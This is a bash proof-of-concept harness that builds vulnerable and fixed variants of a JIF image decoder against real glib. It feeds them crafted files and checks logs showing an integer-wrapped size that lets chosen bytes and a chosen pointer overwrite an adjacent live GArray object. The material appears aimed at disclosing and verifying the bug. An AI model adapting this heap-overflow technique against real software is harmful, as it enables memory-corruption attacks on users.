#!/usr/bin/env bash
# Rebuild and exercise the verbatim JIF pin against REAL glib + REAL zlib.
# Evidence: adjacent live GLib object corruption, vulnerable vs fixed vs safe.
set -u
cd "$(dirname "$0")"
mkdir -p evidence

GLIB_CFLAGS=$(pkg-config --cflags glib-2.0)
GLIB_LIBS=$(pkg-config --libs glib-2.0)
pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -q -- "$2" "$1" 2>/dev/null; }
hasnt() { ! grep -q -- "$2" "$1" 2>/dev/null; }
hasre(){ grep -qE -- "$2" "$1" 2>/dev/null; }
all_4d_48=$(printf '4d%.0s' $(seq 1 48))

echo "== build (real glib $(pkg-config --modversion glib-2.0), real zlib $(dpkg-query -W -f='${Version}' zlib1g 2>/dev/null || echo unknown)) =="
gcc -O0 -g -Wall -I. $GLIB_CFLAGS -o evidence/real-vuln real-driver.c $GLIB_LIBS -lz && ok "real glib vulnerable build" || bad "real glib vulnerable build"
gcc -O0 -g -Wall -I. $GLIB_CFLAGS -DVARIANT_FIXED -o evidence/real-fixed real-driver.c $GLIB_LIBS -lz && ok "real glib fixed build" || bad "real glib fixed build"

echo "== runs =="
evidence/real-vuln attack 4d > evidence/vuln-attack-4d.log 2>&1
evidence/real-vuln attack 41 > evidence/vuln-attack-41.log 2>&1
evidence/real-vuln safe  4d > evidence/vuln-safe.log 2>&1
evidence/real-fixed attack 4d > evidence/fixed-attack.log 2>&1
evidence/real-vuln ptr  4d > evidence/vuln-ptr.log 2>&1
evidence/real-fixed ptr  4d > evidence/fixed-ptr.log 2>&1

echo "== real allocator adjacency =="
has evidence/vuln-attack-4d.log "delta=272" && ok "live GArray control struct exactly 272 bytes after groom chunk" || bad "live GArray control struct exactly 272 bytes after groom chunk"
has evidence/vuln-attack-4d.log "usable=264" && ok "glibc usable size 264 for 260-byte request" || bad "glibc usable size 264 for 260-byte request"

echo "== vulnerable: chosen bytes in adjacent live GLib object =="
has evidence/vuln-attack-4d.log "LIVE_AFTER=$all_4d_48" && ok "all 48 live GArray control-struct bytes carry chosen 0x4d" || bad "all 48 live GArray control-struct bytes carry chosen 0x4d"
has evidence/vuln-attack-41.log "LIVE_AFTER=41414141" && ok "chosen 0x41 bytes in live object" || bad "chosen 0x41 bytes in live object"
hasre evidence/vuln-attack-4d.log "LIVE_CHANGED_BYTES=(47|48)" && ok "live object overwritten (ASLR-safe changed-byte count)" || bad "live object overwritten (ASLR-safe changed-byte count)"

echo "== chosen address in live object's pointer field (no dereference) =="
has evidence/vuln-ptr.log "PTR_MATCH=1" && ok "live GArray data pointer set to chosen valid address" || bad "live GArray data pointer set to chosen valid address"
has evidence/fixed-ptr.log "PTR_MATCH=0" && ok "fixed build leaves live pointer field intact" || bad "fixed build leaves live pointer field intact"

echo "== fixed and safe-input controls =="
has evidence/fixed-attack.log "RC=0 ERR=image data" && ok "fixed build rejects wrapped size" || bad "fixed build rejects wrapped size"
has evidence/fixed-attack.log "LIVE_CHANGED_BYTES=0" && ok "fixed build leaves live object intact" || bad "fixed build leaves live object intact"
has evidence/vuln-safe.log "RC=1" && ok "vulnerable build accepts safe JIF" || bad "vulnerable build accepts safe JIF"
has evidence/vuln-safe.log "LIVE_CHANGED_BYTES=0" && ok "safe input leaves live object intact" || bad "safe input leaves live object intact"

echo "== on-disk JIF99a file path (16-bit frame fields, alpha doubling wraps) =="
python3 make-jif.py evidence/attack.jif bytes 4d > evidence/make-attack.log 2>&1
python3 make-jif.py evidence/ptr.jif   ptr        > evidence/make-ptr.log 2>&1
python3 make-jif.py evidence/safe.jif  safe 4d     > evidence/make-safe.log 2>&1
evidence/real-vuln  file    evidence/attack.jif > evidence/file-attack.log 2>&1
evidence/real-vuln  fileptr evidence/ptr.jif    > evidence/file-ptr.log 2>&1
evidence/real-vuln  file    evidence/safe.jif   > evidence/file-safe.log 2>&1
evidence/real-fixed file    evidence/attack.jif > evidence/file-fixed.log 2>&1
has evidence/file-attack.log "len=33025 height=65026 bpp=8 alpha=1 product=0x80000002 data_size=4" && ok "on-disk 16-bit frame fields reach wrapped data_size 4" || bad "on-disk 16-bit frame fields reach wrapped data_size 4"
has evidence/file-attack.log "FILE_FIELDS" && ok "real FILE* JIF header parse" || bad "real FILE* JIF header parse"
has evidence/file-attack.log "delta=32" && ok "live GLib object 32 bytes after 4-byte indexes chunk" || bad "live GLib object 32 bytes after 4-byte indexes chunk"
has evidence/file-attack.log "LIVE_AFTER=4d4d4d4d4d4d4d4d" && ok "file-chosen bytes overwrite adjacent live object" || bad "file-chosen bytes overwrite adjacent live object"
has evidence/file-ptr.log "PTR_MATCH=1" && ok "file-chosen pointer field in adjacent live object" || bad "file-chosen pointer field in adjacent live object"
has evidence/file-safe.log "LIVE_CHANGED_BYTES=0" && ok "safe on-disk JIF leaves live object intact" || bad "safe on-disk JIF leaves live object intact"
has evidence/file-fixed.log "RC=0 ERR=image data" && ok "fixed build rejects on-disk wrapped input" || bad "fixed build rejects on-disk wrapped input"
has evidence/file-fixed.log "LIVE_CHANGED_BYTES=0" && ok "fixed build leaves live object intact for on-disk input" || bad "fixed build leaves live object intact for on-disk input"

echo "== pinned ReadImage() caller conditions: guard and ~4 GiB dest =="
python3 make-jif.py evidence/published.jif published 4d > evidence/make-published.log 2>&1
evidence/real-vuln  caller    evidence/attack.jif    > evidence/file-caller.log 2>&1
evidence/real-vuln  callerpub evidence/published.jif > evidence/file-callerpub.log 2>&1
evidence/real-fixed callerpub evidence/published.jif > evidence/file-caller-fixed.log 2>&1
has evidence/file-caller.log "GUARD_PASSES=1 DEST_SIZE=4294967300" && ok "pinned 64-bit guard passes for 33025x65026" || bad "pinned 64-bit guard passes for 33025x65026"
has evidence/file-caller.log "DEST_ALLOC=OK" && ok "~4 GiB dest allocation succeeds with real glib" || bad "~4 GiB dest allocation succeeds with real glib"
has evidence/file-caller.log "LIVE_AFTER=4d4d4d4d4d4d4d4d" && ok "chosen bytes reach live neighbour after dest allocation" || bad "chosen bytes reach live neighbour after dest allocation"
has evidence/file-callerpub.log "GUARD_PASSES=1 DEST_SIZE=4294967556" && ok "published 45771x46918 passes guard with ~4 GiB dest" || bad "published 45771x46918 passes guard with ~4 GiB dest"
has evidence/file-callerpub.log "DEST_ALLOC=OK" && ok "published dims dest allocation succeeds" || bad "published dims dest allocation succeeds"
has evidence/file-callerpub.log "delta=272" && ok "260-byte indexes chunk keeps live neighbour at +272" || bad "260-byte indexes chunk keeps live neighbour at +272"
has evidence/file-callerpub.log "LIVE_AFTER=$all_4d_48" && ok "published dims put chosen bytes in all 48 inspected live bytes" || bad "published dims put chosen bytes in all 48 inspected live bytes"
has evidence/file-caller-fixed.log "RC=0 ERR=image data" && ok "fixed pin rejects published dims after caller allocation" || bad "fixed pin rejects published dims after caller allocation"
has evidence/file-caller-fixed.log "LIVE_CHANGED_BYTES=0" && ok "fixed caller leaves live object intact" || bad "fixed caller leaves live object intact"

echo "== mixed-marker JIF: OOB bytes reach live object, not pinned dest =="
python3 make-jif.py evidence/published-mix.jif published-mix 4d 41 \
  > evidence/make-published-mix.log 2>&1
evidence/real-vuln  callerpub evidence/published-mix.jif > evidence/file-caller-mix.log 2>&1
evidence/real-fixed callerpub evidence/published-mix.jif > evidence/file-fixed-mix.log 2>&1
all_41_48=$(printf '41%.0s' $(seq 1 48))
has evidence/file-caller-mix.log "LIVE_AFTER=$all_41_48" \
  && ok "chosen OOB marker 0x41 reaches all 48 live-neighbour bytes" \
  || bad "chosen OOB marker 0x41 reaches all 48 live-neighbour bytes"
has evidence/file-caller-mix.log "DEST_HEX=4dff" \
  && ok "in-bounds index bytes reach pinned dest" \
  || bad "in-bounds index bytes reach pinned dest"
dest_hex=$(grep '^DEST_HEX=' evidence/file-caller-mix.log | cut -d= -f2)
case "$dest_hex" in
  *41*) bad "pinned dest consumed the OOB marker" ;;
  *)    ok "pinned dest has no OOB marker (consumer capped at wrapped data_size)" ;;
esac
has evidence/file-fixed-mix.log "RC=0 ERR=image data" \
  && ok "fixed pin rejects mixed-marker wrapped input" \
  || bad "fixed pin rejects mixed-marker wrapped input"
has evidence/file-fixed-mix.log "LIVE_CHANGED_BYTES=0" \
  && ok "fixed pin leaves live neighbour intact for mixed marker" \
  || bad "fixed pin leaves live neighbour intact for mixed marker"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
